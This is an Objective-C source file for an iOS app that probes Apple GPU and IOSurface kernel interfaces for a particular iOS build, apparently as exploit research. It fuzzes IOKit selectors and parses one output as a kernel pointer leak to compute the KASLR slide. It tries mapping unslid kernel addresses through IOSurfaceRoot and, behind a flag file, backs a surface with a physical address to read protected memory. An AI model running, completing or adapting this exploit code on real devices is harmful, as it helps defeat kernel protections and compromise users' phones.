// IOGPUProbe27 — 27.2 / 24B115 UAT/IOGPU reachability probe
// Build: make ipa  (Theos, arm64, no entitlements)
// Install: sign with your profile, then install.  This build does NOT install itself.
//
// Safe by default.  The only dangerous stage is gated behind
// <Documents>/run_paddr; without that file the probe never asks IOSurface
// to back a surface with physical address 0x04D00000.

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <mach/vm_region.h>
#import <sys/utsname.h>
#import <sys/sysctl.h>
#import <dlfcn.h>
#import <pthread.h>
#import <sys/mman.h>
#import <IOSurface/IOSurfaceRef.h>

static NSString *gLogPath;
static NSMutableString *gLog;
static pthread_mutex_t gLogLock = PTHREAD_MUTEX_INITIALIZER;
static volatile int gStop = 0;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    pthread_mutex_lock(&gLogLock);
    [gLog appendString:s];
    [gLog appendString:@"\n"];
    [gLog writeToFile:gLogPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    pthread_mutex_unlock(&gLogLock);
    NSLog(@"[iogpu27] %@", s);
}

static NSString *hexdump(const void *buf, size_t len) {
    const uint8_t *p = (const uint8_t *)buf;
    NSMutableString *s = [NSMutableString string];
    for (size_t i = 0; i < len; i += 16) {
        [s appendFormat:@"%04zx: ", i];
        for (size_t j = 0; j < 16 && i + j < len; j++) [s appendFormat:@"%02x ", p[i+j]];
        [s appendString:@"\n"];
    }
    return s;
}

static NSString *krstr(kern_return_t kr) {
    return [NSString stringWithFormat:@"0x%x", kr];
}

static uint32_t rd32(const void *p) { uint32_t v; memcpy(&v, p, 4); return v; }
static uint64_t rd64(const void *p) { uint64_t v; memcpy(&v, p, 8); return v; }

// ---------------------------------------------------------------- services

static void log_class(io_object_t obj, const char *tag) {
    char cls[256] = {0};
    if (IOObjectGetClass(obj, cls) != KERN_SUCCESS) return;
    io_registry_entry_t parent = 0;
    char pcls[256] = {0};
    if (IORegistryEntryGetParentEntry(obj, kIOServicePlane, &parent) == KERN_SUCCESS) {
        IOObjectGetClass(parent, pcls);
        IOObjectRelease(parent);
    }
    L(@"[REG] %s class=%s parent=%s", tag, cls, pcls);
}

static void stage_registry(void) {
    L(@"== REG: enumerate AGX/IOGPU/IOGPUDevice ==");
    const char *names[] = {
        "IOGPUDevice", "IOGPUFamily", "AGXAcceleratorG14P",
        "AGXAccelerator", "IOAccelerator", "IOSurfaceRoot",
        "AppleM2ScalerCSCDriver"
    };
    for (size_t i = 0; i < sizeof(names)/sizeof(names[0]); i++) {
        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching(names[i]));
        if (!svc) { L(@"[REG] %s: absent", names[i]); continue; }
        log_class(svc, names[i]);
        io_registry_entry_t parent = 0;
        if (IORegistryEntryGetParentEntry(svc, kIOServicePlane, &parent) == KERN_SUCCESS) {
            log_class(parent, "  parent");
            IOObjectRelease(parent);
        }
        IOObjectRelease(svc);
    }

    // Walk all IOService nodes and print anything whose class looks relevant.
    io_iterator_t it = 0;
    if (IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOService"), &it) == KERN_SUCCESS) {
        io_service_t svc; int n = 0;
        while ((svc = IOIteratorNext(it)) && n < 6000) {
            char cls[256] = {0};
            if (IOObjectGetClass(svc, cls) == KERN_SUCCESS &&
                (strstr(cls, "AGX") || strstr(cls, "IOGPU") || strstr(cls, "IOSurface"))) {
                log_class(svc, "walk");
            }
            IOObjectRelease(svc);
            n++;
        }
        IOObjectRelease(it);
        L(@"[REG] walk done (%d nodes)", n);
    }
}

static io_connect_t try_open(io_service_t svc, uint32_t type, const char *tag) {
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &conn);
    L(@"[OPEN] %s type=%u -> %@ conn=0x%x", tag, type, krstr(kr), conn);
    return (kr == KERN_SUCCESS) ? conn : 0;
}

// ---------------------------------------------------------------- sel1 leak

static void parse_sel1(const uint8_t *o, size_t n) {
    if (n < 0x10) { L(@"[SEL1] short output %zu", n); return; }
    uint64_t q0 = rd64(o + 0x00);
    uint64_t q1 = rd64(o + 0x08);
    L(@"[SEL1] q0=0x%016llx q1=0x%016llx q2=0x%016llx q3=0x%016llx",
      (unsigned long long)q0, (unsigned long long)q1,
      (unsigned long long)rd64(o + 0x10), (unsigned long long)rd64(o + 0x18));
    L(@"[SEL1] %@", [hexdump(o, n > 0x40 ? 0x40 : n) stringByReplacingOccurrencesOfString:@"\n" withString:@" | "]);
    // q1 == 1 is the allocator/refcount marker from the static analysis.
    if ((q1 & 0xffffffffULL) == 1) {
        uint32_t low = (uint32_t)q0;
        uint32_t slide = low - 0x07c67f18u;
        uint64_t text = 0xfffffff007004000ULL + (uint64_t)slide;
        L(@"[SEL1] *** VALID: q1==1, slide=0x%x kernel_text=0x%016llx", slide, (unsigned long long)text);
    } else {
        L(@"[SEL1] q1 != 1 — either IOUAT not initialized or different object");
    }
}

// ---------------------------------------------------------------- per-connection

static void probe_sel0_5(io_connect_t c, const char *label) {
    static const struct { uint32_t sel; size_t out; const char *name; } tab[] = {
        {0, 0x40, "sel0"}, {1, 0x40, "sel1"}, {2, 0x218, "sel2"},
        {3, 0x08, "sel3"}, {4, 0x20, "sel4"}, {5, 0x10, "sel5"},
    };
    for (size_t i = 0; i < sizeof(tab)/sizeof(tab[0]); i++) {
        uint8_t *out = calloc(1, tab[i].out);
        size_t outSize = tab[i].out;
        kern_return_t kr = IOConnectCallMethod(c, tab[i].sel, NULL, 0, NULL, 0,
                                               NULL, NULL, out, &outSize);
        L(@"[%s] %s -> %@ outSize=0x%zx", label, tab[i].name, krstr(kr), outSize);
        if (kr == KERN_SUCCESS) {
            if (tab[i].sel == 1) parse_sel1(out, outSize);
            else L(@"[%s] %s data: %@", label, tab[i].name,
                   [hexdump(out, outSize > 0x40 ? 0x40 : outSize)
                    stringByReplacingOccurrencesOfString:@"\n" withString:@" | "]);
        }
        free(out);
    }
}

static void probe_sel6(io_connect_t c, const char *label) {
    L(@"[%s] sel6 queue sweep 0x408..0x2000 step 8", label);
    uint8_t *in = calloc(1, 0x2000);
    for (uint32_t sz = 0x408; sz <= 0x2000 && !gStop; sz += 8) {
        memset(in, 0, 0x2000);
        // The static handler reads priority at +0x400 and two bools at +0x404/+0x405.
        *(uint32_t *)(in + 0x400) = 0;
        in[0x404] = 1;
        in[0x405] = 0;
        uint8_t out[0x10] = {0};
        size_t outSize = sizeof(out);
        kern_return_t kr = IOConnectCallMethod(c, 6, NULL, 0, in, sz,
                                               NULL, NULL, out, &outSize);
        if (kr == KERN_SUCCESS) {
            L(@"[%s] *** sel6 OK size=0x%x outSize=0x%zx q0=0x%016llx q1=0x%016llx",
              label, sz, outSize, (unsigned long long)rd64(out),
              (unsigned long long)rd64(out + 8));
            // destroy the queue through sel7 (scalar input 1 = queue id)
            uint64_t qid = rd64(out);
            kern_return_t dr = IOConnectCallMethod(c, 7, &qid, 1, NULL, 0,
                                                   NULL, NULL, NULL, NULL);
            L(@"[%s] sel7 destroy qid=0x%llx -> %@", label,
              (unsigned long long)qid, krstr(dr));
            free(in);
            return;
        }
        if ((sz & 0x3ff) == 0) L(@"[%s] sel6 size=0x%x -> %@", label, sz, krstr(kr));
    }
    L(@"[%s] sel6: no size accepted", label);
    free(in);
}

static void probe_sel8(io_connect_t c, const char *label) {
    // Type 0x82 = IOSurface.  This is the layout from the 27.2 handler:
    // +0x00 type, +0x38 surface id, +0x3c plane, input >= 0x58.
    NSDictionary *props = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfacePixelFormat": @0x42475241
    };
    IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!surf) { L(@"[%s] sel8: IOSurfaceCreate failed", label); return; }
    IOSurfaceID sid = IOSurfaceGetID(surf);
    L(@"[%s] sel8: surface id=%u base=%p alloc=%zu", label, sid,
      IOSurfaceGetBaseAddress(surf), IOSurfaceGetAllocSize(surf));

    uint8_t *in = calloc(1, 0x100);
    uint8_t *out = calloc(1, 0x1000);
    *(uint32_t *)(in + 0x00) = 0x82;
    *(uint32_t *)(in + 0x34) = 0;
    *(uint32_t *)(in + 0x38) = sid;
    *(uint32_t *)(in + 0x3c) = 0;
    size_t outSize = 0x1000;
    kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x100,
                                           NULL, NULL, out, &outSize);
    L(@"[%s] sel8 type=0x82 -> %@ outSize=0x%zx", label, krstr(kr), outSize);
    if (kr == KERN_SUCCESS) {
        L(@"[%s] sel8 out: %@", label,
          [hexdump(out, outSize > 0x100 ? 0x100 : outSize)
           stringByReplacingOccurrencesOfString:@"\n" withString:@" | "]);
    }
    free(in); free(out);
    CFRelease((CFTypeRef)surf);
}

static void probe_conn(io_connect_t c, const char *label) {
    if (!c) return;
    probe_sel0_5(c, label);
    probe_sel6(c, label);
    probe_sel8(c, label);
}

// ---------------------------------------------------------------- IOSurfaceRoot

static void iosurface_global_lookup(io_connect_t c) {
    uint8_t *info = calloc(1, 0xc68);
    int found = 0, errors = 0;
    L(@"[GMAP] sel4 sweep ids 1..0x4000, out=0xc68 (safe: no map/read)");
    for (uint32_t id = 1; id < 0x4000 && !gStop; id++) {
        uint64_t sid = id;
        size_t olen = 0xc68;
        memset(info, 0, 0xc68);
        kern_return_t kr = IOConnectCallMethod(c, 4, &sid, 1, NULL, 0,
                                               NULL, NULL, info, &olen);
        if (kr == KERN_SUCCESS) {
            found++;
            if (found <= 64) {
                L(@"[GMAP] id=%u olen=0x%zx id@0x18=%u base=0x%016llx q0=0x%016llx q8=0x%016llx",
                  id, olen, rd32(info + 0x18),
                  (unsigned long long)rd64(info + 0x00),
                  (unsigned long long)rd64(info + 0x08),
                  (unsigned long long)rd64(info + 0x10));
                L(@"[GMAP] info: %@", [hexdump(info, olen > 0x80 ? 0x80 : olen)
                    stringByReplacingOccurrencesOfString:@"\n" withString:@" | "]);
            }
            if (found >= 64) { L(@"[GMAP] stopping after 64"); break; }
        } else errors++;
        if ((id & 0x3ff) == 0) L(@"[GMAP] progress %u found=%d errors=%d", id, found, errors);
    }
    L(@"[GMAP] done found=%d errors=%d", found, errors);
    free(info);
}

static void iosurface_try_range(io_connect_t c, const char *tag, uint64_t addr, uint64_t len) {
    uint8_t *info = calloc(1, 0xc68);
    uint64_t sc[2] = { addr, len };
    size_t olen = 0xc68;
    kern_return_t kr = IOConnectCallMethod(c, 7, sc, 2, NULL, 0,
                                           NULL, NULL, info, &olen);
    L(@"[GMAP] sel7 %s addr=0x%016llx len=0x%llx -> %@ olen=0x%zx",
      tag, (unsigned long long)addr, (unsigned long long)len, krstr(kr), olen);
    if (kr == KERN_SUCCESS) {
        L(@"[GMAP] sel7 %s id@0x18=%u base=0x%016llx q0=0x%016llx q8=0x%016llx",
          tag, rd32(info + 0x18),
          (unsigned long long)rd64(info + 0x00),
          (unsigned long long)rd64(info + 0x08),
          (unsigned long long)rd64(info + 0x10));
        L(@"[GMAP] sel7 %s info: %@", tag,
          [hexdump(info, olen > 0x80 ? 0x80 : olen)
           stringByReplacingOccurrencesOfString:@"\n" withString:@" | "]);
    }
    free(info);
}

static void stage_iosurface(void) {
    L(@"== IOSurfaceRoot: global lookup + address range ==");
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"[GMAP] IOSurfaceRoot absent"); return; }
    io_connect_t c = try_open(svc, 0, "IOSurfaceRoot");
    IOObjectRelease(svc);
    if (!c) return;

    iosurface_global_lookup(c);

    void *u = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (u != MAP_FAILED) {
        memset(u, 0x41, 0x4000);
        iosurface_try_range(c, "user-control", (uint64_t)(uintptr_t)u, 0x4000);
        munmap(u, 0x4000);
    }
    iosurface_try_range(c, "kern-text-unslid", 0xfffffff007004000ULL, 0x4000);
    iosurface_try_range(c, "kern-exec-unslid", 0xfffffff00814c000ULL, 0x4000);
    iosurface_try_range(c, "kern-fn-unslid",   0xfffffff00a9e2000ULL, 0x4000);

    IOServiceClose(c);
}

// ---------------------------------------------------------------- dangerous

static void stage_paddr(void) {
    NSString *flag = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/run_paddr"];
    if (![[NSFileManager defaultManager] fileExistsAtPath:flag]) {
        L(@"[PADDR] skipped: %@ absent", flag);
        return;
    }
    L(@"[PADDR] *** run_paddr present: testing IOSurfaceAddress ***");

    // Control: a user VA.
    void *u = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (u != MAP_FAILED) {
        memset(u, 0x41, 0x4000);
        NSDictionary *p = @{
            @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
            @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @0x42475241,
            @"IOSurfaceAddress": @((uint64_t)(uintptr_t)u),
            @"IOSurfaceAllocSize": @0x4000
        };
        IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)p);
        L(@"[PADDR] control userVA=%p -> surface=%p base=%p alloc=%zu",
          u, s, s ? IOSurfaceGetBaseAddress(s) : NULL,
          s ? IOSurfaceGetAllocSize(s) : 0);
        if (s) CFRelease((CFTypeRef)s);
        munmap(u, 0x4000);
    }

    // Target: the SPTM TTBAT candidate.
    NSDictionary *p = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @0x42475241,
        @"IOSurfaceAddress": @0x04D00000ULL,
        @"IOSurfaceAllocSize": @0x20000ULL
    };
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)p);
    L(@"[PADDR] addr=0x04D00000 len=0x20000 -> surface=%p base=%p alloc=%zu",
      s, s ? IOSurfaceGetBaseAddress(s) : NULL, s ? IOSurfaceGetAllocSize(s) : 0);
    if (s) {
        void *base = IOSurfaceGetBaseAddress(s);
        if (base) {
            L(@"[PADDR] first qwords: %@",
              [hexdump(base, 0x20)
               stringByReplacingOccurrencesOfString:@"\n" withString:@" | "]);
        } else {
            L(@"[PADDR] base is NULL");
        }
        CFRelease((CFTypeRef)s);
    }
}

// ---------------------------------------------------------------- main

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UITextView *tv;
@end

@implementation AppDelegate

- (void)appendLogToUI {
    pthread_mutex_lock(&gLogLock);
    NSString *copy = [gLog copy];
    pthread_mutex_unlock(&gLogLock);
    dispatch_async(dispatch_get_main_queue(), ^{
        self.tv.text = copy;
        if (copy.length > 0) [self.tv scrollRangeToVisible:NSMakeRange(copy.length - 1, 1)];
    });
}

- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    gLog = [NSMutableString new];
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    [[NSFileManager defaultManager] createDirectoryAtPath:docs
                              withIntermediateDirectories:YES attributes:nil error:nil];
    gLogPath = [docs stringByAppendingPathComponent:@"iogpu27.log"];
    [gLog writeToFile:gLogPath atomically:YES encoding:NSUTF8StringEncoding error:nil];

    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    self.tv = [[UITextView alloc] initWithFrame:vc.view.bounds];
    self.tv.editable = NO;
    self.tv.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    [vc.view addSubview:self.tv];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.6 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        L(@"=== IOGPUProbe27 start ===");
        L(@"log: %@", gLogPath);
        struct utsname un; uname(&un);
        L(@"device=%s version=%s", un.machine, un.version);

        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            @autoreleasepool {
                stage_registry();
                [self appendLogToUI];

                // AGX type 1 (control)
                io_service_t agx = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                               IOServiceMatching("AGXAcceleratorG14P"));
                io_connect_t agxc = 0;
                io_service_t parent = 0;
                if (agx) {
                    agxc = try_open(agx, 1, "AGXAcceleratorG14P");
                    if (IORegistryEntryGetParentEntry(agx, kIOServicePlane, &parent) == KERN_SUCCESS) {
                        log_class(parent, "AGX parent");
                        io_connect_t pc = try_open((io_service_t)parent, 0, "AGX parent");
                        if (pc) probe_conn(pc, "AGXparent");
                        if (pc) IOServiceClose(pc);
                    }
                }

                // IOGPUDevice type 0 (the untested path)
                io_service_t dev = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                               IOServiceMatching("IOGPUDevice"));
                io_connect_t devc = 0;
                if (dev) {
                    log_class(dev, "IOGPUDevice");
                    devc = try_open(dev, 0, "IOGPUDevice");
                    IOObjectRelease(dev);
                } else {
                    L(@"[OPEN] IOGPUDevice absent as a matching service");
                }
                if (devc) probe_conn(devc, "IOGPUDevice");

                // AGX type 1 as a separate control if it opened.
                if (agxc) probe_conn(agxc, "AGXtype1");

                if (devc) IOServiceClose(devc);
                if (agxc) IOServiceClose(agxc);
                if (parent) IOObjectRelease(parent);
                if (agx) IOObjectRelease(agx);

                stage_iosurface();
                [self appendLogToUI];

                stage_paddr();
                [self appendLogToUI];

                L(@"=== done ===");
                [self appendLogToUI];
            }
        });
    });
    return YES;
}
@end

int main(int argc, char **argv) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
